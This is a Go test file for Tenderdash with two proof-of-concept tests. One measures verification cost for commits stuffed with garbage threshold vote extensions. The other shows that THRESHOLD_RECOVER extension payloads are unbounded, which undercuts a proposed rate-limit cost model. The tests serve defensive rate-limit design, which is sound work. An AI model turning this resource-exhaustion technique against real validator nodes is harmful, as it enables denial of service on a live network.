package types

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/dashpay/tenderdash/crypto"
	tmproto "github.com/dashpay/tenderdash/proto/tendermint/types"
)

// Measures the victim's CPU cost of one inbound commit as a function of the
// number of threshold vote extensions the attacker packs into it, and compares
// it against the cost of a single vote's block-signature verification.
//
// This is the number the spec's rate-limit default has to be denominated in.
func TestPoC_CommitVerificationCostScalesWithExtensionCount(t *testing.T) {
	vals, _ := RandValidatorSet(4)
	const chainID = "test-chain"

	build := func(n int) *Commit {
		exts := make([]*tmproto.VoteExtension, n)
		for i := range exts {
			exts[i] = &tmproto.VoteExtension{
				Type:      tmproto.VoteExtensionType_THRESHOLD_RECOVER,
				Extension: []byte("x"),
				// 96 bytes of garbage: not a valid G2 point, so this is the
				// attacker's CHEAPEST option. A real point costs the victim more.
				Signature: make([]byte, 96),
			}
		}
		commit, err := CommitFromProto(&tmproto.Commit{
			Height: 100,
			Round:  0,
			BlockID: tmproto.BlockID{
				Hash:          crypto.Checksum([]byte("block")),
				PartSetHeader: tmproto.PartSetHeader{Total: 1, Hash: crypto.Checksum([]byte("parts"))},
				StateID:       crypto.Checksum([]byte("state")),
			},
			QuorumHash:              vals.QuorumHash,
			ThresholdBlockSignature: make([]byte, SignatureSize),
			ThresholdVoteExtensions: exts,
		})
		require.NoError(t, err)
		return commit
	}

	measure := func(n int) (time.Duration, int) {
		c := build(n)
		start := time.Now()
		err := vals.VerifyCommit(chainID, c.BlockID, c.Height, c)
		elapsed := time.Since(start)
		require.Error(t, err, "signatures are garbage; verification must fail")
		// Wire size the attacker paid for.
		pb := c.ToProto()
		return elapsed, pb.Size()
	}

	base, baseBytes := measure(0)
	t.Logf("commit with    0 extensions: %8v  (%6d wire bytes)", base, baseBytes)

	for _, n := range []int{1, 100, 1000} {
		d, wire := measure(n)
		t.Logf("commit with %4d extensions: %8v  (%6d wire bytes)  => %.1f ns per attacker byte",
			n, d, wire, float64(d.Nanoseconds())/float64(wire))
	}
}

// The proposed cost function nTokens = 1 + len(VoteExtensions) assumes cost is
// linear in the *count* of extensions. It is not: a THRESHOLD_RECOVER extension
// has no bound on its payload size, and that payload is canonicalized, marshaled
// and SHA-256'd on the receive path. One extension with a 1 MB payload is charged
// 2 tokens.
func TestPoC_ExtensionPayloadSizeIsUnbounded(t *testing.T) {
	huge := make([]byte, 900_000)

	ext := &tmproto.VoteExtension{
		Type:      tmproto.VoteExtensionType_THRESHOLD_RECOVER,
		Extension: huge,
		Signature: make([]byte, 96),
	}
	require.NoError(t, ext.Validate(),
		"VoteExtension.Validate bounds the payload only for THRESHOLD_RECOVER_RAW (32 bytes); "+
			"THRESHOLD_RECOVER payloads are bounded only by the 1 MB p2p message cap")

	// And it flows all the way into sign-item derivation.
	v := &Vote{
		Type:               tmproto.PrecommitType,
		Height:             100,
		Round:              0,
		BlockID:            BlockID{Hash: crypto.Checksum([]byte("b")), PartSetHeader: PartSetHeader{Total: 1, Hash: crypto.Checksum([]byte("p"))}, StateID: crypto.Checksum([]byte("s"))},
		ValidatorProTxHash: crypto.Checksum([]byte("v")),
		BlockSignature:     make([]byte, SignatureSize),
		VoteExtensions:     MustVoteExtensionsFromProto(t, ext),
	}
	require.NoError(t, v.ValidateBasic(), "a ~900 KB single-extension precommit passes ValidateBasic")

	start := time.Now()
	qsd, err := MakeQuorumSigns("test-chain", 106, crypto.Checksum([]byte("q")), v.ToProto())
	require.NoError(t, err)
	require.Len(t, qsd.VoteExtensionSignItems, 1)
	t.Logf("MakeQuorumSigns over one 900 KB extension: %v (charged 1+1 = 2 tokens by the proposed model)", time.Since(start))
}
